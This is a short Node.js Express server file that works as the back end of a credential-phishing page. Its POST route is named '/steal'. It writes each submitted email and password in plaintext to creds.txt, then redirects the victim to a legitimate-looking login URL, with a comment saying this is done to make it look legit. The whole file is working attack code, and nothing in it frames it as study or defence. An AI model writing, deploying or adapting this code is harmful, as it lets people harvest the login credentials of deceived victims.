const express = require("express");
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");

const app = express();
const PORT = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));

app.post("/steal", (req, res) => {
  const { email, password } = req.body;

  const log = `Email: ${email} | Password: ${password}\n`;
  fs.appendFile("creds.txt", log, (err) => {
    if (err) {
      console.error("Error writing to file:", err);
      return res.status(500).send("Error occurred.");
    }

    res.redirect("https://example.com/login"); // redirect to make it look legit
  });
});

app.listen(PORT, () => {
  console.log(`🚨 Server running at http://localhost:${PORT}`);
});
